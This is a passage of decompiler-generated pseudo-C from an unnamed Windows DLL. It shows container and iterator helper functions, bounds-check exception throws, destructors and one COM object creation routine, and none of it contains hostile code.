    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10041094(v1);
}

//----- (1003CEFE) --------------------------------------------------------
HRESULT __usercall sub_1003CEFE@<eax>(void *a1@<ecx>, _DWORD *a2@<edi>)
{
  HRESULT v2; // esi
  LPVOID ppv; // [esp+0h] [ebp-4h] BYREF

  ppv = a1;
  if ( *a2 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a2 + 8))(*a2);
  v2 = CoCreateInstance(&stru_10095894, 0, 0x17u, &stru_10095884, &ppv);
  if ( v2 < 0 )
    goto LABEL_7;
  v2 = OleRun((LPUNKNOWN)ppv);
  if ( v2 >= 0 )
    v2 = (**(int (__stdcall ***)(LPVOID, void *, _DWORD *))ppv)(ppv, &unk_10095874, a2);
  (*(void (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 8))(ppv);
  if ( v2 < 0 )
LABEL_7:
    *a2 = 0;
  return v2;
}

//----- (1003CF61) --------------------------------------------------------
_DWORD *__thiscall sub_1003CF61(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003E82A(this, v3, 0);
  else
    v4 = 0;
  sub_1004117E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003CFBE) --------------------------------------------------------
_DWORD *__thiscall sub_1003CFBE(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003E99A(this, v3, 0);
  else
    v4 = 0;
  sub_10041215(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D01B) --------------------------------------------------------
_DWORD *__thiscall sub_1003D01B(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003E82A(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1004117E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D080) --------------------------------------------------------
_DWORD *__thiscall sub_1003D080(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003E99A(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10041215(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D0E5) --------------------------------------------------------
_DWORD *__thiscall sub_1003D0E5(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003E82A(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1004117E(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D164) --------------------------------------------------------
_DWORD *__thiscall sub_1003D164(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003E99A(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10041215(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D1E3) --------------------------------------------------------
void *__thiscall sub_1003D1E3(_DWORD *this)
{
  void *result; // eax

  result = &loc_1007527F;
  *this = &off_10095624;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10095624: using guessed type int (__thiscall *off_10095624)(void *Block, char);

//----- (1003D20D) --------------------------------------------------------
int *__thiscall sub_1003D20D(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DD9A(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003D265: variable 'v5' is possibly undefined

//----- (1003D280) --------------------------------------------------------
int *__thiscall sub_1003D280(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DDDA(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003D2D8: variable 'v5' is possibly undefined

//----- (1003D2F3) --------------------------------------------------------
void __thiscall sub_1003D2F3(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_100411C2(v2);
}

//----- (1003D331) --------------------------------------------------------
void __thiscall sub_1003D331(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_100411C2(v3);
}

//----- (1003D372) --------------------------------------------------------
void __thiscall sub_1003D372(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_100411C2(v2);
}

//----- (1003D3B0) --------------------------------------------------------
int __thiscall sub_1003D3B0(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10041259(v4);
  return v2;
}

//----- (1003D3F4) --------------------------------------------------------
int __thiscall sub_1003D3F4(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_100411C2(v4);
  return v2;
}

//----- (1003D438) --------------------------------------------------------
void __thiscall sub_1003D438(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_100411C2(v1);
}

//----- (1003D48D) --------------------------------------------------------
_DWORD *__thiscall sub_1003D48D(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003EB0A(this, v3, 0);
  else
    v4 = 0;
  sub_100412AC(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D4EA) --------------------------------------------------------
_DWORD *__thiscall sub_1003D4EA(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1003EC7A(this, v3, 0);
  else
    v4 = 0;
  sub_10041343(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D547) --------------------------------------------------------
_DWORD *__thiscall sub_1003D547(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003EB0A(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100412AC(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D5AC) --------------------------------------------------------
_DWORD *__thiscall sub_1003D5AC(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1003EC7A(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10041343(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D611) --------------------------------------------------------
_DWORD *__thiscall sub_1003D611(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003EB0A(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100412AC(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D690) --------------------------------------------------------
_DWORD *__thiscall sub_1003D690(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1003EC7A(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10041343(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1003D70F) --------------------------------------------------------
void *__thiscall sub_1003D70F(_DWORD *this)
{
  void *result; // eax

  result = &loc_1007514D;
  *this = &off_1009569C;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 1009569C: using guessed type int (__thiscall *off_1009569C)(void *Block, char);

//----- (1003D739) --------------------------------------------------------
int *__thiscall sub_1003D739(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DE10(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003D791: variable 'v5' is possibly undefined

//----- (1003D7AC) --------------------------------------------------------
int *__thiscall sub_1003D7AC(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1003DE50(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1003D804: variable 'v5' is possibly undefined

//----- (1003D81F) --------------------------------------------------------
void __thiscall sub_1003D81F(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_100412F0(v2);
}

//----- (1003D85D) --------------------------------------------------------
void __thiscall sub_1003D85D(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_100412F0(v3);
}

//----- (1003D89E) --------------------------------------------------------
void __thiscall sub_1003D89E(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_100412F0(v2);
}

//----- (1003D8DC) --------------------------------------------------------
int __thiscall sub_1003D8DC(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10041387(v4);
  return v2;
}

//----- (1003D920) --------------------------------------------------------
int __thiscall sub_1003D920(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_100412F0(v4);
  return v2;
}

//----- (1003D964) --------------------------------------------------------
void __thiscall sub_1003D964(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_100412F0(v1);
}

//----- (1003D9B9) --------------------------------------------------------
_DWORD *__thiscall sub_1003D9B9(_DWORD *Block, char a2)
{
  sub_1003BF0F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003DA2C) --------------------------------------------------------
_DWORD *__thiscall sub_1003DA2C(_DWORD *Block, char a2)
{
  sub_1003C1DB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003DA65) --------------------------------------------------------
_DWORD *__thiscall sub_1003DA65(_DWORD *Block, char a2)
{
  sub_1003C700(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003DA9E) --------------------------------------------------------
_DWORD *__thiscall sub_1003DA9E(_DWORD *Block, char a2)
{
  sub_1003CC25(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003DAF4) --------------------------------------------------------
_DWORD *__thiscall sub_1003DAF4(_DWORD *Block, char a2)
{
  sub_1003D1E3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003DB4A) --------------------------------------------------------
_DWORD *__thiscall sub_1003DB4A(_DWORD *Block, char a2)
{
  sub_1003D70F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003DBB2) --------------------------------------------------------
int __usercall sub_1003DBB2@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DBE8) --------------------------------------------------------
int __usercall sub_1003DBE8@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DC19) --------------------------------------------------------
int __thiscall sub_1003DC19(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1003DC51) --------------------------------------------------------
int __usercall sub_1003DC51@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DC8C) --------------------------------------------------------
int __thiscall sub_1003DC8C(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1003DCC4) --------------------------------------------------------
int __usercall sub_1003DCC4@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DD04) --------------------------------------------------------
int __usercall sub_1003DD04@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DD44) --------------------------------------------------------
int __usercall sub_1003DD44@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DD9A) --------------------------------------------------------
int __usercall sub_1003DD9A@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DDDA) --------------------------------------------------------
int __usercall sub_1003DDDA@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DE10) --------------------------------------------------------
int __usercall sub_1003DE10@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DE50) --------------------------------------------------------
int __usercall sub_1003DE50@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1003DE81) --------------------------------------------------------
_DWORD *__stdcall sub_1003DE81(_DWORD *a1, int a2)
{
  *a1 = &off_10095320;
  a1[1] = a2;
  *a1 = &off_10095714;
  sub_1003EFF0(a1 + 2);
  a1[7] = 0;
  return a1;
}
// 10095320: using guessed type int (__thiscall *off_10095320)(void *Block, char);
// 10095714: using guessed type int (__thiscall *off_10095714)(void *Block, char);

//----- (1003DECB) --------------------------------------------------------
BOOL __thiscall sub_1003DECB(int this)
{
  return *(_DWORD *)(this + 28) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003DEDE) --------------------------------------------------------
BOOL __thiscall sub_1003DEDE(_DWORD *this)
{
  return this[7] != 0;
}

//----- (1003DEE8) --------------------------------------------------------
_DWORD *__thiscall sub_1003DEE8(_DWORD *this)
{
  _DWORD *v2; // eax
  int v3; // eax
  int v5; // [esp-4h] [ebp-Ch]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[7]);
  v5 = this[7];
  this[3] = *v2;
  v3 = (*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, v5);
  sub_1003F02A(v3, (int)(this + 2));
  return this + 2;
}

//----- (1003DF1C) --------------------------------------------------------
void __thiscall sub_1003DF1C(_DWORD *this)
{
  ++this[7];
}

//----- (1003DF20) --------------------------------------------------------
void __thiscall sub_1003DF20(_DWORD *this)
{
  --this[7];
}

//----- (1003DF24) --------------------------------------------------------
void __noreturn sub_1003DF24()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1003DF24: using guessed type void __noreturn sub_1003DF24();
// 1003DF24: using guessed type _DWORD pExceptionObject[2];

//----- (1003DF41) --------------------------------------------------------
void __noreturn sub_1003DF41()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1003DF41: using guessed type void __noreturn sub_1003DF41();
// 1003DF41: using guessed type _DWORD pExceptionObject[2];

//----- (1003DF5E) --------------------------------------------------------
void __thiscall sub_1003DF5E(_DWORD *this)
{
  *this = off_1009531C;
  sub_1000A9D3(this + 2);
}
// 1009531C: using guessed type int (__thiscall *off_1009531C[2])(void *Block, char);

//----- (1003DF8A) --------------------------------------------------------
_DWORD *__thiscall sub_1003DF8A(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10095474;
  a2[1] = this;
  *a2 = &off_10095734;
  a2[2] = a3;
  return result;
}
// 10095474: using guessed type int (__thiscall *off_10095474)(void *Block, char);
// 10095734: using guessed type int (__thiscall *off_10095734)(void *Block, char);

//----- (1003DFC2) --------------------------------------------------------
void *__thiscall sub_1003DFC2(_DWORD *this)
{
  void *result; // eax

  result = &loc_10075077;
  *this = &off_10095734;
  *this = &off_10095474;
  return result;
}
// 10095474: using guessed type int (__thiscall *off_10095474)(void *Block, char);
// 10095734: using guessed type int (__thiscall *off_10095734)(void *Block, char);

//----- (1003DFEC) --------------------------------------------------------
bool __thiscall sub_1003DFEC(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003E003) --------------------------------------------------------
BOOL __thiscall sub_1003E003(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1003E00D) --------------------------------------------------------
int __thiscall sub_1003E00D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1003E048) --------------------------------------------------------
int __thiscall sub_1003E048(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1003E07E) --------------------------------------------------------
int __thiscall sub_1003E07E(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
